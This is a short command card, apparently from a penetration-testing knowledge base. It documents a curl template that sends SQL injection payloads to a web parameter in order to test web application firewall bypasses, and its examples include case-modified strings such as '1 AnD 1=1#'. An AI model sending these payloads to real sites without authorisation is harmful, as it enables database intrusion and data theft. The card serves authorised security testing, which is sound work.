---
id: new-uuid-curl
name: curl-send-sqli-payload
type: command
executor: bash
data: 'curl "http://$_TARGET/page?id=$_PAYLOAD"'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web
  - sqli
  - http
verified: true
validated: true
---

# curl-send-sqli-payload

## Command

```bash
curl "http://$_TARGET/page?id=$_PAYLOAD"
```

## Description

Sends an HTTP GET request with a SQL injection payload via curl, useful for testing WAF bypasses on vulnerable web parameters. Use in penetration testing to deliver obfuscated SQLi strings and observe responses for success.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target hostname or IP (e.g., example.com) | Yes |
| $_PAYLOAD | SQLi payload string (e.g., 1 AND 1=1#) | Yes |

## Examples

### Basic Usage

```bash
curl "http://example.com/search?id=1 AND 1=1#"
```

### Advanced Usage

```bash
curl -X GET "http://example.com/search?id=1 AnD 1=1#" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html> (full page or data dump if SQLi succeeds; 403/ blocked if WAF triggers)

## Related

- [[procedures/SQL-Injection-WAF-Bypass-using-Case-Modification]]
